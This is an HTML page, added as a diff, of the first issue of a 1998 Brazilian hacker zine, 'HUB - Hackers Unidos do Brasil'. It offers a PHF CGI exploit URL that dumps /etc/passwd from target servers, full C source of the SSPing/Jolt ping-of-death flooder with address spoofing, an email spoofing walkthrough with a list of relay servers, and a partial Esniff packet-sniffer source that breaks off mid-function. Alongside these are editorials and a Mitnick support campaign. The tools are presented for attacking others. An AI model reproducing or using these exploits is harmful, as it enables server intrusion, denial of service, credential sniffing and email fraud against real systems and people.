@@ -1,0 +1,1422 @@
+<html>
+<!-- This document was created with Notepad       -->
+<!-- Author: Cyber Optik                          -->
+<!-- Date:   30/03/98                             -->
+<!-- Este &eacute; o nº 1!!!!                            -->
+<head>
+	<title>HUB - Hackers Unidos do Brasil</title>
+<script language="JavaScript">
+<!--
+// this script was provided by
+// Stefan - the Programinator
+// mailto:trickys@doomhammer.com
+// http://www.doomhammer.com
+// with very minor modification by kiratoy@2600.com
+//
+// e adaptado/traduzido para o Portugu&ecirc;s por Overall...
+//
+// please credit him accordingly if you use this script
+// thanks
+var Temp2;
+var timerID = null;
+var timerRunning = false;
+function showtime() {
+now = new Date();
+var CurHour = now.getHours();
+var CurMinute = now.getMinutes();
+var CurMonth = now.getMonth();
+var CurDate = now.getDate();
+var CurYear = now.getYear();
+var CurSecond = now.getSeconds();
+now = null;
+Hours = CurHour
+Minutes = CurMinute
+Seconds = CurSecond
+var Years = CurYear - 95
+// now.getMoth() is apparently base 0!
+var Months = CurMonth - 2 + 1
+var Dates = CurDate - 15
+if (Dates < 0)
+{
+	Dates = 28 - 15 + CurDate
+// roll back 1 month
+	Months = Months - 1
+}
+if (Months < 0)
+{
+	Months = 12 - 2 + CurMonth
+// roll back 1 year
+	Years = Years - 1
+}
+if(Years < 0) {Years = 0}
+if (Years!=1) {var ys="s"} else {var ys=""};
+if (Months!=1) {var mos="es"} else {var mos=""}
+if (Dates!=1) {var ds="s"} else {var ds=""}
+if (Hours!=1) {var hs="s"} else {var hs=""}
+if (Minutes!=1) {var mis="s"} else {var mis=""}
+if (Seconds!=1) {var ss="s"} else {var ss=""}
+/* Temp2='Kevin has been imprisoned without a trial for '+Years+'
+   year'+ys+','+Months+' month'+mos+', '+Dates+' day'+ds+', '+Hours+' hour'+hs+', '
+   +Minutes+'minute'+mis+', '+Seconds+' second'+ss+' and counting! ' */
+
+Temp3=Years+' ano'+ys+', '+Months+' mês'+mos+', '+Dates+' dia'+ds+', '+Hours+' hora'+hs+', '+Minutes+' minuto'+mis+', '+Seconds+' segundo'+ss
+document.frm.left.value=Temp3;
+timerID = setTimeout("showtime()",1000);
+timerRunning = true;
+}
+var timerID = null;
+var timerRunning = false;
+function stopclock () {
+if(timerRunning)
+clearTimeout(timerID);
+timerRunning = false;
+}
+function startclock () {
+// Make sure the clock is stopped
+stopclock();
+showtime();
+}
+// -->
+</script>
+</head>
+<body background="hub_back.jpg" onload="startclock();" link="#FFFFCC" vlink="#CCCCAA" bgcolor="#00000" text="#FFFF00">
+<br><br><center><img src="hub_ani.gif" width="120" height="90"><font size="7" color="#FFFF00">HUB</font>
+<img src="hub_ani.gif" width="120" height="90"></center><br>
+<center><h1>Editores</h1>
+Cyber Optik
+(<a href="mailto:cyberoptik@hackhour.com.br">cyberoptik@hackhour.com.br</a>)<br>
+
+Overall
+(<a href="mailto:overall@hackhour.com.br">overall@hackhour.com.br</a><br>
+
+<h1>Colaboradores</h1>
+ARG
+(<a href="mailto:arg_hhh@geocities.com">arg_hhh@geocities.com</a>)<br>
+
+Bat
+(<a href="mailto:bat@hackhour.com.br">bat@hackhour.com.br</a>)<br>
+
+Ben Reilly
+(<a href="mailto:benreilly@mailexcite.com">benreilly@mailexcite.com</a><br>
+
+Cosmo
+<a href="mailto:cosmo@mandic.com.br">cosmo@mandic.com.br</a><br>
+
+Earth Quake
+(<a href="mailto:equake@hackhour.com.br">equake@hackhour.com.br</a>)<br>
+
+Fernanda Serpa
+(<a href="mailto:fserpa@netmarket.com.br">fserpa@netmarket.com.br</a>)<br>
+
+Jaba Hanks
+(<a href="mailto:jabahanks@geocities.com">jabahanks@geocities.com</a>)<br>
+
+Lufe
+(<A HREF="mailto:lufe@iname.com">lufe@iname.com</A>)<br>
+(entre outros que preferiram n&atilde;o se identificar)
+</center>
+
+<p><hr><p>
+
+<h1><a name="index">Index</a></h1><br>
+<ol>
+<li><a href="#editove">Editorial (Overall)</a>
+<li><a href="#editco">Editorial (Cyber Optik)</a>
+<li><a href="#Desenterrando">Desenterrando Velharias...</a><br>
+<li><a href="#Ping">SSPing (c&oacute;digo fonte)</a><br>
+<li><a href="#Fakemail">Como enviar um Fakemail.</a><br>
+<li><a href="#Sniffer">Sniffer para Netware (c&oacute;digo fonte)</a><br>
+<li><a href="#Kevin">Ajudem Kevin Mitnick...</a> (Fernanda Serpa)<br>
+<li><a href="#Brutes">Teste: Brutes... qual &eacute; o melhor?</a><br>
+<li><a href="#Netware">Hackeando o netware da sua escola...</a> (ARG)<br>
+<li><a href="#Tel">Telefonia no Brasil</a> (Ben Reilly)<br>
+<li><a href="#Modem">Como transformar seu modem UsRobotics Sportster em um Courier</a> (Earth Quake)<br>
+<li><a href="#Netscape">Crackeando o Netscape e os passwords do Microsoft Mail</a> (The.Avatar - traduzido por BAT)<br>
+<li><a href="#ICQBug">Bug no ICQ</a> (Lufe)<br>
+<li><a href="#linguagens">Linguagens de Programa&ccedil;&atilde;o</a> (Jabahanks)<br>
+<li><a href="#reforma">Reforma Agr&aacute;ria no Ar</a>
+<li><a href="#hippie">Humor (em Ingl&ecirc;s) - The Conscience of a Hippie</a>
+<li><a href="#Creditos">Creditos</a><br>
+</ol>
+
+<p><hr><p>
+
+<center><h1>
+<a name="editove">Editorial - Overall</a>
+</h1></center>
+<b>Objetivo: </b>transmitir informa&ccedil;&otilde;es que n&atilde;o s&atilde;o facilmente encontradas sem que se leia as entrelinhas. Bugs, exploits, falhas em sistemas operacionais, t&eacute;cnicas de hacking e coisas do tipo ser&atilde;o constantes em nossas p&aacute;ginas virtuais.
+<p>
+<b>Linguagem: </b>n&atilde;o usaremos linguagem chula em nossos textos, pois nosso objetivo n&atilde;o &eacute; ofender ningu&eacute;m, mas informar. Apesar de que sempre tem uma hora ou outra que uma linguagenzinha de baixo cal&atilde;o n&atilde;o faz mal &agrave; ningu&eacute;m... eheheh :-)
+<p>
+<b>Formato: </b>ainda n&atilde;o definitivamente decidido. Estamos soltando o n&uacute;mero 1 no formato HTML para preservarmos a acentua&ccedil;&atilde;o portuguesa, para termos um m&iacute;nimo de formata&ccedil;&atilde;o de texto (negrito, it&aacute;lico, etc) e para facilitar a divulga&ccedil;&atilde;o pela web. Apesar de estarmos usando o HTML, n&atilde;o usaremos nenhum recurso que o primeiro Mosaic n&atilde;o possa abrir.
+<p>
+<b>Tamanho: </b>pequeno. A id&eacute;ia &eacute; que tenhamos edi&ccedil;&otilde;es frequentes e n&atilde;o muito longas, para facilitar nosso trabalho no levantamento dos dados e para nos certificar que a informa&ccedil;&atilde;o &eacute; nova.
+<p>
+<b>Estilo: </b>livre. Como temos diversos autores, e aceitamos textos enviados por terceiros, desde que de autoria pr&oacute;pria ou tradu&ccedil;&otilde;es, n&atilde;o temos como ter um estilo uniforme. Cada um faz seu estilo. Somos um pa&iacute;s livre! Nada de imposi&ccedil;&otilde;es! eheheh...
+<p>
+<b>Conte&uacute;do: </b>livre. Desde o assunto tenha a ver com computadores falaremos de tudo um pouco e de um pouco, tudo. :-)
+<p>
+Bom... Acho que pra come&ccedil;ar &eacute; isso. S&oacute; queria lembrar que nenhum de n&oacute;s tem filhos em idade de ler e que por isso n&atilde;o, repito N&Atilde;O nos responsabilizamos por nenhum, repito NENHUM ato cometido por qualquer pessoa que ler este zine, n&atilde;o importa se foi ou n&atilde;o inspirado no que dissemos, nos arquivos que mencionarmos, nos fontes que dermos ou em qualquer material relacionado &agrave; HUB. Se voc&ecirc; fizer merda isso &eacute; problema seu. Corre pra tua m&atilde;e. Se vira! T&ocirc; fora, bro...
+<p>
+Ah! Gostaria tamb&eacute;m de mencionar nosso apoio ao pessoal da Anistia Internacional no que diz respeito &agrave; <a href="#Kevin">pris&atilde;o de Kevin Mitnick</a>. P&ocirc;! O cara t&aacute; preso &agrave; um temp&atilde;o e nem julgado ele foi ainda... Ningu&eacute;m sabe nem se ele &eacute; culpado ou inocente... Pegaram o cara pra Cristo! Eu sei que isso n&atilde;o foi no Brasil, mas com a repercuss&atilde;o que esse caso ainda t&aacute; tendo pelo mundo, se a moda pega aqui no Brasil tamb&eacute;m, vai sobrar cadeia pra tudo quanto &eacute; lado...
+<p>
+<center>
+<form name="frm">
+Tempo que Kevin est&aacute; na pris&atilde;o aguardando julgamento...
+<input type="textarea" name="left" size=60 value="Checking...">
+</form>
+</center>
+<p><a href="mailto:overall@hackhour.com.br">Overall</a>
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+<h1><center>
+<a name="editco">Editorial - Cyber Optik</a>
+</center></h1>
+E a&iacute; galera!!! Estamos finalmente comemorando a primeira edi&ccedil;&atilde;o da HUB. At&eacute; que enfim!!! Achei que fossemos parar na edi&ccedil;&atilde;o 0 (zero). Bom, como &eacute; uma edi&ccedil;&atilde;o especial, eu precisava colocar algumas coisas legais, mas infelizmente meu tempo anda meio curto (&eacute;, eu estudo e trabalho!), portanto vou tentar ser o mais breve poss&iacute;vel nas explica&ccedil;&otilde;es. Qualquer d&uacute;vida mande um email para cyberoptik@hackhour.com.br, mas lembrem-se: S&oacute; ser&atilde;o respondidas as perguntas cab&iacute;veis, perguntas que eu considerar "Lammer" n&atilde;o ser&atilde;o respondidas. Perguntas lammers, enviem para
+<a href="mailto:billg@microsoft.com">#@!$¨*</a> que elas ser&atilde;o respondidas...
+<p>
+Bom gostaria, antes de iniciar, de pedir desculpas por n&atilde;o publicar ainda a FAQ de "Como Hackear NT", pois o tempo foi muito curto e eu n&atilde;o pude terminar de fazer todos os testes ainda, mas assim que estiver pronto, com certeza eu publicarei.
+<p>
+Creio que essa edi&ccedil;&atilde;o ser&aacute; de grande utilidade para os amantes da computa&ccedil;&atilde;o pois colocamos mat&eacute;rias bem diversificadas para agradar todos os gostos. Mas vamos ao que interessa:<br>
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+<center><h1>
+<a name="Desenterrando">Desenterrando Velharias</a>
+</center></h1>
+<h2>T&eacute;cnica de PHF</h2>
+Esta &eacute; uma t&eacute;cnica que eu acho que funciona em muitos servidores ainda, mas muitos j&aacute; corrigiram esse Bug. Mas do que se trata? A T&eacute;cnica do PHF, consiste na forma mais f&aacute;cil de pegar o arquivo de Passwords de um servidor que tenha um Lammer como Sys Admim. Como ele funciona? Simples, r&aacute;pido e n&atilde;o requer pr&aacute;tica; qualquer lammer pode fazer, basta abrir seu browser e digitar:
+<p>
+http://o_dominio_vai_aqui/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+<p>
+Substitua o "o_dominio_vai_aqui" pelo dominio que vc deseja detonar...<br>
+Se for uma pagina da web &eacute; quase a mesma coisa:
+<p>
+http://www.p&aacute;gina_da_web.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+<p>
+Se funcionar, tire uma c&oacute;pia do arquivo e parta para a comemora&ccedil;&atilde;o... Se n&atilde;o souber o que fazer com esse arquivo, v&aacute; assitir "Chiquititas" que vc ganha mais...
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+<h1><center>
+<a name="Ping">SSPing (Source)</a>
+</h1></center>
+Esse &eacute; o fonte do famoso SSPING. At&eacute; onde eu sei esta &eacute; uma vers&atilde;o para Linux. Se quiser tente compil&aacute;-lo em outros Unix´s, mas nem tente em rWin95...
+<p>
+Na boa... Se voc&ecirc; n&atilde;o sabe compilar isso, nem tente perguntar... RTFM...
+<p>
+(<a href="mailto:overall@hackhour.com.br">Overall</a>)
+<pre>
+ #define __BSD_SOURCE
+                       #include &lt;stdio.h&gt;
+                       #include &lt;sys/types.h&gt;
+                       #include &lt;sys/socket.h&gt;
+                       #include &lt;netdb.h&gt;
+                       #include &lt;netinet/in.h&gt;
+                       #include &lt;netinet/in_systm.h&gt;
+                       #include &lt;netinet/ip.h&gt;
+                       #include &lt;netinet/ip_icmp.h&gt;
+                       #include &lt;string.h&gt;
+                       #include &lt;arpa/inet.h&gt;
+                       int main(int argc, char **argv)
+                       {
+                       int s,i;
+                       char buf[400];
+                       struct ip *ip = (struct ip *)buf;
+                       struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
+                       struct hostent *hp, *hp2;
+                       struct sockaddr_in dst;
+                       int offset;
+                       int on;
+                       int num = 5;
+                       if (argc < 3) {
+                       printf("Jolt v1.0 Yet ANOTHER windows95(And macOS!) compiled by
+                       Cyber Optik\n");
+                       printf("\nusage: %s <dstaddr> <saddr> [number]\n",argv[0]);
+                       printf("\tdstaddr is the host your attacking\n");
+                       printf("\tsaddr is the host your spoofing from\n");
+                       printf("\tNumber is the number of packets to send, 5 is the default\n");
+                       printf("\nNOTE: This is based on a bug that used to affect POSIX
+                       complient, and SYSV \n\t systems so its nothing new..\n");
+                       printf("\nGreets to Bill Gates! How do ya like this one? :-)\n");
+                       exit(1);
+                       }
+                       if (argc == 4) num = atoi(argv[3]);
+                       for (i=1;i<=num;i++) {
+                       on=1;
+                       bzero(buf, sizeof buf);
+                       if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW )) < 0) {
+                       perror("socket");
+                       exit(1);
+                       }
+                       if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
+                       perror("IP_HDRINCL");
+                       exit(1);
+                       }
+                       if ((hp = gethostbyname(argv[1])) == NULL) {
+                       if ((ip->ip_dst.s_addr = inet_addr(argv[1])) == -1) {
+                       fprintf(stderr, "%s: unknown host\n", argv[1]);
+                       exit(1);
+                       }
+                       } else {
+                       bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
+                       }
+                       if ((hp2 = gethostbyname(argv[2])) == NULL) {
+                       if ((ip->ip_src.s_addr = inet_addr(argv[2])) == -1) {
+                       fprintf(stderr, "%s: unknown host\n", argv[2]);
+                       exit(1);
+                       }
+                       } else {
+                       bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);
+                       }
+                       printf("Sending to %s\n", inet_ntoa(ip->ip_dst));
+                       ip->ip_v = 4;
+                       ip->ip_hl = sizeof *ip >> 2;
+                       ip->ip_tos = 0;
+                       ip->ip_len = htons(sizeof buf);
+                       ip->ip_id = htons(4321);
+                       ip->ip_off = htons(0);
+                       ip->ip_ttl = 255;
+                       ip->ip_p = 1;
+                       ip->ip_csum = 0; /* kernel fills in */
+                       dst.sin_addr = ip->ip_dst;
+                       dst.sin_family = AF_INET;
+                       icmp->type = ICMP_ECHO;
+                       icmp->code = 0;
+                       icmp->checksum = htons(~(ICMP_ECHO << 8));
+                       for (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip)) {
+                       ip->ip_off = htons(offset >> 3);
+                       if (offset < 65120)
+                       ip->ip_off |= htons(0x2000);
+                       else
+                       ip->ip_len = htons(418); /* make total 65538 */
+                       if (sendto(s, buf, sizeof buf, 0, (struct sockaddr *)&dst,
+                       sizeof dst) < 0) {
+                       fprintf(stderr, "offset %d: ", offset);
+                       perror("sendto");
+                       }
+                       if (offset == 0) {
+                       icmp->type = 0;
+                       icmp->code = 0;
+                       icmp->checksum = 0;
+                       }
+                       }
+                       close(s);
+                       usleep(30000);
+                       }
+                       return 0;
+                       }
+</pre>
+ D&ecirc; uma compilada nisso, vale a pena!
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+<h1><center>
+<a name="Fakemail">FakeMail</a>
+</center></h1>
+Fa&ccedil;a telnet na porta de SMTP do servidor, a default &eacute; a 25. 
+<p>
+Digite :
+<p>
+telnet whitehouse.gov 25
+<p>
+Agora vc precisar&aacute; se comunicar com o outro computador. D&ecirc; um "Helo" para abrir essa cominica&ccedil;&atilde;o. Em seguida, d&ecirc; um "<b>MAIL FROM:</b>" e digite o email que quiser. Logo em seguida digite "<b>RCPT TO:</b>" e coloque o email do destinat&aacute;rio. Digite "<b>DATA</b>" e monte o fake, tomando cuidado com o cabe&ccedil;alho (Subject, CC, From...) e por fim d&ecirc; um ponto "." e "<b>QUIT</b>".<br>
+Ex:<p>
+<pre>
+HELO polonorte.gov
+MAIL FROM:  papainoel@polonorte.gov
+RCPT TO: billgates@microsoft.com
+DATA
+< to: billgates@microsoft.com
+< from: papainoel@polonorte.gov
+< subject: Presentes
+<
+< Voce nao foi um bom garoto e por isso nao vai
+< ganhar presentes este ano...
+< Tente fazer um OS melhor no ano q vem...
+< .
+QUIT
+</pre><p>
+N&atilde;o esque&ccedil;a de formatar bem seu texto, caso contr&aacute;rio qualquer lammer desconfiar&aacute; de seu fakemail.
+<p>
+OBS:Note que alguns servidores tem o RFC 931 implementado, esconder a linha "MAIL FROM:" n&atilde;o funcionar&aacute;. Envie primeiramente um email para vc mesmo antes de fazer qualquer besteira. Para maiores informa&ccedil;&otilde;es leia o RFC 822 "Standart for a format of ARPA Internet messages."
+<p>
+Alguns servidores:
+<pre>
+Nome do servidor         Porta de conex&atilde;o
+plix.com                 25
+ids.net                  25
+student.uq.edu.au        25
+istar.ca                 25
+total.net                25
+future.net               25
+netfoward.com            25
+netcreations.com         25
+hwg.org                  25
+w3.org                   25
+mit.edu                  25
+nytimes.com              25
+ns.net                   25
+</pre>
+O jeito mais facil de saber quais portas de um servidor est&atilde;o abertas, &eacute; passando um Portscan nele...
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+<center><h1>
+<a name="Sniffer">Sniffer para Netware...</a>
+</center></h1>
+Mais uma vez c vc &ntilde; sabe compilar isso... RTFM...
+<p><a href="mailto:overall@hackhour.com.br">Overall</a>
+<pre>
+/* Esniff.c */
+#include &lt;stdio.h&gt;
+#include &lt;ctype.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/time.h&gt;
+#include &lt;sys/file.h&gt;
+#include &lt;sys/stropts.h&gt;
+#include &lt;sys/signal.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;net/if.h&gt;
+#include &lt;net/nit_if.h&gt;
+#include &lt;net/nit_buf.h&gt;
+#include &lt;net/if_arp.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netinet/if_ether.h&gt;
+#include &lt;netinet/in_systm.h&gt;
+#include &lt;netinet/ip.h&gt;
+#include &lt;netinet/udp.h&gt;
+#include &lt;netinet/ip_var.h&gt;
+#include &lt;netinet/udp_var.h&gt;
+#include &lt;netinet/in_systm.h&gt;
+#include &lt;netinet/tcp.h&gt;
+#include &lt;netinet/ip_icmp.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;arpa/inet.h&gt;
+#define ERR stderr
+char    *malloc();
+char    *device,
+        *ProgName,
+        *LogName;
+FILE    *LOG;
+int     debug=0;
+#define NIT_DEV     "/dev/nit"
+#define CHUNKSIZE   4096        /* device buffer size */
+int     if_fd = -1;
+int     Packet[CHUNKSIZE+32];
+void Pexit(err,msg)
+int err; char *msg;
+{ perror(msg);
+  exit(err); }
+void Zexit(err,msg)
+int err; char *msg;
+{ fprintf(ERR,msg);
+  exit(err); }
+#define IP          ((struct ip *)Packet)
+#define IP_OFFSET   (0x1FFF)
+#define SZETH       (sizeof(struct ether_header))
+#define IPLEN       (ntohs(ip->ip_len))
+#define IPHLEN      (ip->ip_hl)
+#define TCPOFF      (tcph->th_off)
+#define IPS         (ip->ip_src)
+#define IPD         (ip->ip_dst)
+#define TCPS        (tcph->th_sport)
+#define TCPD        (tcph->th_dport)
+#define IPeq(s,t)   ((s).s_addr == (t).s_addr)
+#define TCPFL(FLAGS) (tcph->th_flags & (FLAGS))
+#define MAXBUFLEN  (128)
+time_t  LastTIME = 0;
+struct CREC {
+     struct CREC *Next,
+                 *Last;
+     time_t  Time;              /* start time */
+     struct in_addr SRCip,
+                    DSTip;
+     u_int   SRCport,           /* src/dst ports */
+             DSTport;
+     u_char  Data[MAXBUFLEN+2]; /* important stuff :-) */
+     u_int   Length;            /* current data length */
+     u_int   PKcnt;             /* # pkts */
+     u_long  LASTseq;
+};
+struct CREC *CLroot = NULL;
+char *Symaddr(ip)
+register struct in_addr ip;
+{ register struct hostent *he =
+      gethostbyaddr((char *)&ip.s_addr, sizeof(struct in_addr),AF_INET);
+  return( (he)?(he->h_name):(inet_ntoa(ip)) );
+}
+char *TCPflags(flgs)
+register u_char flgs;
+{ static char iobuf[8];
+#define SFL(P,THF,C) iobuf[P]=((flgs & THF)?C:'-')
+  SFL(0,TH_FIN, 'F');
+  SFL(1,TH_SYN, 'S');
+  SFL(2,TH_RST, 'R');
+  SFL(3,TH_PUSH,'P');
+  SFL(4,TH_ACK, 'A');
+  SFL(5,TH_URG, 'U');
+  iobuf[6]=0;
+  return(iobuf);
+}
+char *SERVp(port)
+register u_int port;
+{ static char buf[10];
+  register char *p;
+   switch(port) {
+     case IPPORT_LOGINSERVER: p="rlogin"; break;
+     case IPPORT_TELNET:      p="telnet"; break;
+     case IPPORT_SMTP:        p="smtp"; break;
+     case IPPORT_FTP:         p="ftp"; break;
+     default: sprintf(buf,"%u",port); p=buf; break;
+   }
+   return(p);
+}
+char *Ptm(t)
+register time_t *t;
+{ register char *p = ctime(t);
+  p[strlen(p)-6]=0; /* strip " YYYY\n" */
+  return(p);
+}
+char *NOWtm()
+{ time_t tm;
+  time(&tm);
+  return( Ptm(&tm) );
+}
+#define MAX(a,b) (((a)>(b))?(a):(b))
+#define MIN(a,b) (((a)<(b))?(a):(b))
+/* add an item */
+#define ADD_NODE(SIP,DIP,SPORT,DPORT,DATA,LEN) { \
+  register struct CREC *CLtmp = \
+        (struct CREC *)malloc(sizeof(struct CREC)); \
+  time( &(CLtmp->Time) ); \
+  CLtmp->SRCip.s_addr = SIP.s_addr; \
+  CLtmp->DSTip.s_addr = DIP.s_addr; \
+  CLtmp->SRCport = SPORT; \
+  CLtmp->DSTport = DPORT; \
+  CLtmp->Length = MIN(LEN,MAXBUFLEN); \
+  bcopy( (u_char *)DATA, (u_char *)CLtmp->Data, CLtmp->Length); \
+  CLtmp->PKcnt = 1; \
+  CLtmp->Next = CLroot; \
+  CLtmp->Last = NULL; \
+  CLroot = CLtmp; \
+}
+register struct CREC *GET_NODE(Sip,SP,Dip,DP)
+register struct in_addr Sip,Dip;
+register u_int SP,DP;
+{ register struct CREC *CLr = CLroot;
+  while(CLr != NULL) {
+    if( (CLr->SRCport == SP) && (CLr->DSTport == DP) &&
+        IPeq(CLr->SRCip,Sip) && IPeq(CLr->DSTip,Dip) )
+            break;
+    CLr = CLr->Next;
+  }
+  return(CLr);
+}
+#define ADDDATA_NODE(CL,DATA,LEN) { \
+ bcopy((u_char *)DATA, (u_char *)&CL->Data[CL->Length],LEN); \
+ CL->Length += LEN; \
+}
+#define PR_DATA(dp,ln) {    \
+  register u_char lastc=0; \
+  while(ln-- >0) { \
+     if(*dp < 32) {  \
+        switch(*dp) { \
+            case '\0': if((lastc=='\r') || (lastc=='\n') || lastc=='\0') \
+                        break; \
+            case '\r': \
+            case '\n': fprintf(LOG,"\n     : "); \
+                        break; \
+            default  : fprintf(LOG,"^%c", (*dp + 64)); \
+                        break; \
+        } \
+     } else { \
+        if(isprint(*dp)) fputc(*dp,LOG); \
+        else fprintf(LOG,"(%d)",*dp); \
+     } \
+     lastc = *dp++; \
+  } \
+  fflush(LOG); \
+}
+void END_NODE(CLe,d,dl,msg)
+register struct CREC *CLe;
+register u_char *d;
+register int dl;
+register char *msg;
+{
+   fprintf(LOG,"\n-- TCP/IP LOG -- TM: %s --\n", Ptm(&CLe->Time));
+   fprintf(LOG," PATH: %s(%s) =>", Symaddr(CLe->SRCip),SERVp(CLe->SRCport));
+   fprintf(LOG," %s(%s)\n", Symaddr(CLe->DSTip),SERVp(CLe->DSTport));
+   fprintf(LOG," STAT: %s, %d pkts, %d bytes [%s]\n",
+                        NOWtm(),CLe->PKcnt,(CLe->Length+dl),msg);
+   fprintf(LOG," DATA: ");
+    { register u_int i = CLe->Length;
+      register u_char *p = CLe->Data;
+      PR_DATA(p,i);
+      PR_DATA(d,dl);
+    }
+   fprintf(LOG,"\n-- \n");
+   fflush(LOG);
+   if(CLe->Next != NULL)
+    CLe->Next->Last = CLe->Last;
+   if(CLe->Last != NULL)
+    CLe->Last->Next = CLe->Next;
+   else
+    CLroot = CLe->Next;
+   free(CLe);
+}
+/* 30 mins (x 60 seconds) */
+#define IDLE_TIMEOUT 1800
+#define IDLE_NODE() { \
+  time_t tm; \
+  time(&tm); \
+  if(LastTIME<tm) { \
+     register struct CREC *CLe,*CLt = CLroot; \
+     LastTIME=(tm+IDLE_TIMEOUT); tm-=IDLE_TIMEOUT; \
+     while(CLe=CLt) { \
+       CLt=CLe->Next; \
+       if(CLe->Time <tm) \
+           END_NODE(CLe,(u_char *)NULL,0,"IDLE TIMEOUT"); \
+     } \
+  } \
+}
+void filter(cp, pktlen)
+register char *cp;
+register u_int pktlen;
+{
+ register struct ip     *ip;
+ register struct tcphdr *tcph;
+</pre>
+</pre>
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+<b><a name="Kevin"><font size=7 color="#FF1111">Ajude Kevin!</font></a></b>
+<p>
+<b>Kevin David Mitnick</b>, nascido em Van Nuys, Calif&oacute;rnia em 06.08.63. Preso em 15.02.95 sob alega&ccedil;&atilde;o de viola&ccedil;&atilde;o de condicional, acesso n&atilde;o autorizado a sistemas de comunica&ccedil;&atilde;o, entre outras acusa&ccedil;&otilde;es. Encontra-se detido atualmente no Metropolitan Detention Center, de Los Angeles, Calif&oacute;rnia.
+<p>
+Meu nome &eacute; Fernanda Serpa, sou ativista de direitos humanos e membro da Anistia Internacional. Juntamente com dois amigos, Gustavo Weide, t&eacute;cnico em computa&ccedil;&atilde;o e Ana Elisa Prates, ativista de direitos humanos, estamos iniciando uma campanha a n&iacute;vel mundial para assegurar ao "hacker" <b>Kevin David Mitnick</b>, um julgamento justo e condi&ccedil;&otilde;es carcer&aacute;rias saud&aacute;veis de acordo com a <b>Declara&ccedil;&atilde;o Universal dos Direitos Humanos</b>, em especial nos seus artigos V, VI, VII, VIII, X, XI-1 e 2 que v&ecirc;m sendo sistematicamente violados no caso em quest&atilde;o. De acordo com a imprensa americana e internacional, <b>Kevin David Mitnick</b> foi preso sob condi&ccedil;&otilde;es ilegais contrariando a <b>Declara&ccedil;&atilde;o Universal dos Direitos Humanos</b> e a pr&oacute;pria Constitui&ccedil;&atilde;o Americana. A grande "ca&ccedil;ada eletr&ocirc;nica" desencadeada contra Mitnick exp&ocirc;s inclusive a t&ecirc;nue linha que separa os direitos constitucionais da privacidade com o cumprimento das leis que, parece, foram violadas em nome da suposta "amea&ccedil;a" chamada <b>Kevin Mitnick</b>.
+<p>
+<h2><font color="#FF1111">Preocupa&ccedil;&atilde;o por maus tratos</b></font></h2>
+<b>Kevin Mitnick</b> j&aacute; teve seus direitos violados quando da sua pris&atilde;o anterior em dezembro de 1988. Foi negada sua fian&ccedil;a apesar da legisla&ccedil;&atilde;o americana afirmar que a Lei Federal s&oacute; "considera perigoso para a sociedade o r&eacute;u que foi acusado de crime violento, crime capital ou crime relacionado com drogas envolvendo uma senten&ccedil;a de mais de dez anos".
+<p>
+Trecho do livro de Jonathan Littman - "O Jogo do Fugitivo - Em linha direta com <b>Kevin Mitnick</b>":
+<p>
+<p><i>"Ele cumpriu oito meses na solit&aacute;ria no Centro Metropolitano de Deten&ccedil;&atilde;o de Los Angeles e quatro meses em Lompoc, perto da costa, onde conheceu Ivan Boesky. Depois, ap&oacute;s seis meses numa resid&ecirc;ncia judia de transi&ccedil;&atilde;o para o retorno &agrave; sociedade, <b>Kevin Mitnick</b> tentou reingressar na for&ccedil;a de trabalho. Conseguiu um lugar de programador em Las Vegas, mas seu empregador tinha tanto medo da sua reputa&ccedil;&atilde;o que ele n&atilde;o podia ficar sozinho na sala dos computadores. Pela lei, Mitnick teve de contar que era um ex-condenado.</p>
+<p>Finalmente, depois que perdeu o emprego de programador em Las Vegas, em junho de 1991, Mitnick convenceu-se de que seus esfor&ccedil;os eram em v&atilde;o. Ele candidatou-se a emprego em todos os cassinos informatizados: Caesar's, Mirage, Sands. Todos pareciam interessados, at&eacute; que seu agente da condicional telefonava ou escrevia.</p>
+<p>O governo federal decidira que <b>Kevin Mitnick</b> era um perigo para a sociedade, e, como um estuprador condenado ou um molestador de crian&ccedil;as, ele era monitorado. Seu agente da condicional entrava persistentemente em contato com os poss&iacute;veis empregadores: 'Ele tem acesso a dinheiro em esp&eacute;cie? Quero que o senhor compreenda o perigo...' ".</i></p>
+<p>Fala <b>Kevin Mitnick</b> no mesmo livro:</p>
+<p><i>" - Cumpri oito meses no MDC ( Metropolitan Detention Center - Los Angeles ). A solit&aacute;ria era um inferno. Diziam que eu era demasiado perigoso para chegar perto de um telefone. Deixavam que eu sa&iacute;sse uma hora por dia. Algemam voc&ecirc; quando o levam para o banho. &Eacute; como no cinema. Tratam voc&ecirc; como um animal. Um s&oacute; dia j&aacute; &eacute; o inferno. Imagine oito meses. Ferram com as pessoas."</i></p>
+<p><b>Como est&aacute; Kevin agora? N&atilde;o sabemos... A julgar pelo tratamento degradante a que foi submetido anteriormente, teme-se por maus tratos.</b></p>
+<p>
+<h2><font color="#FF1111"><b>Um hacker ao velho estilo</b></font></h2>
